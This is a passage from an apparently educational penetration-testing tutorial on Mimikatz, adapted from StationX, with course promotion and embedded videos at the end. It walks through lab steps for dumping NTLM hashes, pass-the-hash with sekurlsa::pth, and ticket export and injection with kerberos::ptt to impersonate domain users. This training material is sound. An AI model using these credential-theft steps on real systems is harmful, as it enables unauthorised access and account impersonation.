[![Command to Generate a Golden Ticket](https://www.stationx.net/wp-content/uploads/2024/02/15.-Command-to-Generate-a-Golden-Ticket.jpg)](https://www.stationx.net/wp-content/uploads/2024/02/15.-Command-to-Generate-a-Golden-Ticket.jpg)

Here you can see that the new Kerberos ticket is injected into this Mimikatz session. This allows you to authenticate to any resource in your current domain [or even across domains](https://adsecurity.org/?p=1640). 

The `kerberos::list` command shows all the Kerberos tickets you have in your current session, similar to the `klist` terminal command.

## Pass-the-Hash (PtH) Techniques

If you cannot gain access to the KRBTGT account, you can perform lateral movement using a pass-the-hash attack with Mimikatz. 

This requires system-level privileges, the NTLM password hash of the account you want to impersonate, and NTLM authentication enabled for the server or service you are attempting to access. 

Read [Pass the Hash Attacks: How to Make Network Compromise Easy](https://www.stationx.net/pass-the-hash-attack/) for more details.

To perform a pass-the-hash attack in Mimikatz, first dump the user’s NTLM hash with a command like `sekurlsa::logonpasswords`.

[![Pass-the-Hash (PtH) Techniques](https://www.stationx.net/wp-content/uploads/2024/02/16.-Pass-the-Hash-PtH-Techniques.jpg)](https://www.stationx.net/wp-content/uploads/2024/02/16.-Pass-the-Hash-PtH-Techniques.jpg)

Next, gather the username `/user`, domain `/domain`, and password hash `/ntlm` you want to use in your pass-the-hash attack. Once gathered, use the `sekurlsa::pth` command to perform the attack.

[![Pass-the-hash attack](https://www.stationx.net/wp-content/uploads/2024/02/17.-Pass-the-hash-attack.jpg)](https://www.stationx.net/wp-content/uploads/2024/02/17.-Pass-the-hash-attack.jpg)

By default, this will start a command prompt as the Administrator user and inject the impersonated credential information into this process, allowing you to impersonate that user and access resources they have permission to. 

From the screenshot above, the `StationX-admin` user does not have permission to read the `secrets` network folder. The `StationX-user` does. Impersonating this user gives us access, as shown in the spawned command prompt on the bottom left.

This is a useful option if you are executing Mimikatz through a C2 agent and want to customize the command that is automatically run using the `/run` option. 

However, if you don’t want to automatically run a command, add the `/impersonate` option to the command. This will create a token in your current Mimikatz session that impersonates that user.

[![Create a Token in Your Current Mimikatz Session](https://www.stationx.net/wp-content/uploads/2024/02/18.-Create-a-Token-in-Your-Current-Mimikatz-Session.jpg)](https://www.stationx.net/wp-content/uploads/2024/02/18.-Create-a-Token-in-Your-Current-Mimikatz-Session.jpg)

NTLM authentication will be turned off in security-hardened environments, and resources will enforce Kerberos authentication. This is where over-pass-the-hash attacks come in.

## Over-Pass-the-Hash (Pass-the-Key) Attacks

An over-pass-the-hash attack involves extracting a target user’s Kerberos authentication ticket and injecting it into your session. This allows you to impersonate the target user and access resources they have permission to. 

Performing an over-pass-the-hash attack is simple. 

First, you extract the Kerberos tickets on the compromised machine using the `sekurlsa::tickets /export` command, as showcased previously. Then you use the `kerberos::ptt` command followed by the name of the user ticket you want to impersonate.

[![Over-Pass-the-Hash (Pass-the-Key) Attacks](https://www.stationx.net/wp-content/uploads/2024/02/19.-Over-Pass-the-Hash-Pass-the-Key-Attacks.jpg)](https://www.stationx.net/wp-content/uploads/2024/02/19.-Over-Pass-the-Hash-Pass-the-Key-Attacks.jpg)

This will inject—or pass—the Kerberos ticket into your current session. You can now spawn a terminal from this Mimikatz process with the command `misc::cmd` (1) and confirm you have the Kerberos token ready to use by running `klist` (2).

[![Kerberos Ticket Into Your Current Session](https://www.stationx.net/wp-content/uploads/2024/02/20.-Kerberos-Ticket-Into-Your-Current-Session.jpg)](https://www.stationx.net/wp-content/uploads/2024/02/20.-Kerberos-Ticket-Into-Your-Current-Session.jpg)

Here, you can see the token for the `StationX-user` has been stolen, allowing you to access resources this user has permission to (3).

If the Mimikatz `kerberos::ptt` command is not working as expected, you may need to try another Kerberos ticket extraction tool like [ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py) or [Rubeus](https://github.com/GhostPack/Rubeus). For more information, check out [this GitHub thread](https://github.com/gentilkiwi/mimikatz/issues/294).

## Conclusion

Mimikatz is an incredibly powerful tool. 

You’ve seen how it can extract encrypted passwords, dump credentials, and be used in attacks like pass-the-hash and over-pass-the-hash. 

Its ability to attack Windows authentication protocols like NTLM and Kerberos has made it a staple in the pen testing and red teaming industry for a long time. 

Use the demonstrations in this article as a starting point, and keep exploring all the features this awesome tool offers by [creating your own virtual hacking environment](https://www.stationx.net/how-to-create-a-virtual-hacking-lab/).

Many industry certifications like the [OSCP](https://www.stationx.net/oscp-certification-salary/), PNTP, and CRTO require using Mimikatz to perform hands-on hacking exercises. 

A great way to prepare for these exams and learn more about Mimkatz is by taking one of the courses offered at StationX. A [StationX membership](https://www.stationx.net/join) also opens access to labs, study groups, mentorship, a custom certification roadmap, and much more!

**Credit:** This information was adapted from an excellent guide on [StationX](https://www.stationx.net/how-to-use-mimikatz/). Be sure to check out the original post for more details.

<iframe width="560" height="315" src="https://www.youtube.com/embed/AZirvtZNIEw?si=pt_H86Vy2OMyJX9w" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

**Credit:** This information was adapted from an excellent guide on [YouTube](https://www.youtube.com/watch?v=AZirvtZNIEw&t=74s). Be sure to check out the original post for more details.

<iframe width="560" height="315" src="https://www.youtube.com/embed/_KppC5wkrgU?si=UfN3xb1e2THMaROq" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

**Credit:** This information was adapted from an excellent guide on [YouTube](https://www.youtube.com/watch?v=_KppC5wkrgU). Be sure to check out the original post for more details.

<iframe width="560" height="315" src="https://www.youtube.com/embed/3lBPEyQaptI?si=rC615XKuyYwXd5Hw&amp;start=330" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

**Credit:** This information was adapted from an excellent guide on [YouTube](https://www.youtube.com/watch?v=3lBPEyQaptI). Be sure to check out the original post for more details.



